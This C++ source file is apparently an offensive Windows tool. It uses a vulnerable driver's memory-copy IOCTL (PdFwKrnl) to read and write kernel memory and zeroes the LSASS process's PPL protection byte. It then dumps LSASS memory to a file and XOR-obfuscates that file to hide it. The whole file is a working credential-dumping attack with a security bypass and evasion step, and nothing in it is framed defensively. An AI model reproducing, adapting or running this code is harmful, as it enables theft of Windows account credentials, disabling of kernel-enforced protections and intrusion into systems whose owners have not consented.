#include <windows.h>
#include <psapi.h>
#include <dbghelp.h>
#include <winternl.h>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <string>
#include <vector>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "dbghelp.lib")

#define DEVICE_PATH   "\\\\.\\PdFwKrnl"
#define IOCTL_MEMCPY  0x80002014

#pragma pack(push, 1)
struct PdMemCpyReq {
    uint64_t dst;
    uint64_t src;
    uint32_t size;
};
#pragma pack(pop)

constexpr ULONG OFF_UNIQUE_PID   = 0x440;
constexpr ULONG OFF_ACTIVE_LINKS = 0x448;
constexpr ULONG OFF_PROTECTION   = 0x87A;

static HANDLE g_dev = INVALID_HANDLE_VALUE;

static bool KRead(uint64_t va, void* out, size_t sz) {
    PdMemCpyReq r{ (uint64_t)out, va, (uint32_t)sz };
    DWORD ret = 0;
    return DeviceIoControl(g_dev, IOCTL_MEMCPY, &r, sizeof(r), nullptr, 0, &ret, nullptr) != 0;
}

static bool KWrite(uint64_t va, const void* src, size_t sz) {
    PdMemCpyReq r{ va, (uint64_t)src, (uint32_t)sz };
    DWORD ret = 0;
    return DeviceIoControl(g_dev, IOCTL_MEMCPY, &r, sizeof(r), nullptr, 0, &ret, nullptr) != 0;
}

static uint64_t KernelBase() {
    LPVOID drv[512]; DWORD cb = 0;
    if (!EnumDeviceDrivers(drv, sizeof(drv), &cb)) return 0;
    return (uint64_t)drv[0];
}

static uint64_t ResolveExport(const char* mod, const char* name) {
    HMODULE h = LoadLibraryExA(mod, nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!h) return 0;
    FARPROC p = GetProcAddress(h, name);
    uint64_t rva = p ? (uint64_t)p - (uint64_t)h : 0;
    FreeLibrary(h);
    return rva ? KernelBase() + rva : 0;
}

static DWORD FindLsass() {
    DWORD pids[2048], cb = 0;
    if (!EnumProcesses(pids, sizeof(pids), &cb)) return 0;
    for (DWORD i = 0; i < cb/sizeof(DWORD); i++) {
        HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pids[i]);
        if (!h) continue;
        wchar_t name[MAX_PATH]{};
        DWORD sz = MAX_PATH;
        if (QueryFullProcessImageNameW(h, 0, name, &sz)) {
            std::wstring wp = name;
            if (wp.find(L"lsass.exe") != std::wstring::npos) {
                CloseHandle(h); return pids[i];
            }
        }
        CloseHandle(h);
    }
    return 0;
}

static bool StripPpl(DWORD targetPid) {
    uint64_t psInit = ResolveExport("ntoskrnl.exe", "PsInitialSystemProcess");
    if (!psInit) return false;
    uint64_t sys = 0;
    if (!KRead(psInit, &sys, sizeof(sys)) || !sys) return false;

    uint64_t cur = sys;
    for (int i = 0; i < 4096; i++) {
        DWORD pid = 0;
        KRead(cur + OFF_UNIQUE_PID, &pid, sizeof(pid));
        if (pid == targetPid) {
            uint8_t zero = 0;
            printf("[+] Stripping PPL from PID %lu (EPROCESS 0x%llx)\n",
                   pid, (unsigned long long)cur);
            return KWrite(cur + OFF_PROTECTION, &zero, 1);
        }
        uint64_t flink = 0;
        KRead(cur + OFF_ACTIVE_LINKS, &flink, sizeof(flink));
        if (!flink) break;
        cur = flink - OFF_ACTIVE_LINKS;
        if (cur == sys) break;
    }
    return false;
}

static bool XorFile(const std::string& p, uint8_t key) {
    HANDLE h = CreateFileA(p.c_str(), GENERIC_READ|GENERIC_WRITE, 0, nullptr,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    LARGE_INTEGER sz{}; GetFileSizeEx(h, &sz);
    std::vector<uint8_t> buf((size_t)sz.QuadPart);
    DWORD n = 0;
    ReadFile(h, buf.data(), (DWORD)buf.size(), &n, nullptr);
    for (auto& b : buf) b ^= key;
    SetFilePointer(h, 0, nullptr, FILE_BEGIN);
    WriteFile(h, buf.data(), (DWORD)buf.size(), &n, nullptr);
    CloseHandle(h);
    return true;
}

int main(int argc, char** argv) {
    std::string outPath = "warp_dump.bin";
    uint8_t xorKey = 0x55;

    for (int i = 1; i < argc; i++) {
        std::string a = argv[i];
        if (a == "--out" && i+1 < argc) outPath = argv[++i];
        else if (a == "--xor-key" && i+1 < argc) xorKey = (uint8_t)strtoul(argv[++i], nullptr, 16);
        else if (a == "--help") {
            printf("usage: %s [--out PATH] [--xor-key HEX]\n", argv[0]);
            printf("assumes PdFwKrnl service already installed & running\n");
            return 0;
        }
    }

    g_dev = CreateFileA(DEVICE_PATH, GENERIC_READ|GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] Open %s failed: %lu\n", DEVICE_PATH, GetLastError());
        return 1;
    }

    DWORD lsassPid = FindLsass();
    if (!lsassPid) { printf("[-] lsass.exe not found\n"); return 1; }
    printf("[+] LSASS pid = %lu\n", lsassPid);

    if (!StripPpl(lsassPid)) { printf("[-] PPL strip failed\n"); return 1; }

    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPid);
    if (!h) { printf("[-] OpenProcess failed after PPL strip: %lu\n", GetLastError()); return 1; }

    HANDLE fh = CreateFileA(outPath.c_str(), GENERIC_WRITE, 0, nullptr,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (fh == INVALID_HANDLE_VALUE) { printf("[-] CreateFile failed\n"); return 1; }

    BOOL ok = MiniDumpWriteDump(h, lsassPid, fh, MiniDumpWithFullMemory,
                                nullptr, nullptr, nullptr);
    CloseHandle(fh); CloseHandle(h); CloseHandle(g_dev);

    if (!ok) { printf("[-] MiniDump failed: 0x%lx\n", GetLastError()); return 1; }
    printf("[+] Dump written to %s\n", outPath.c_str());
    if (xorKey) { XorFile(outPath, xorKey); printf("[+] XOR-obfuscated with 0x%02x\n", xorKey); }
    return 0;
}
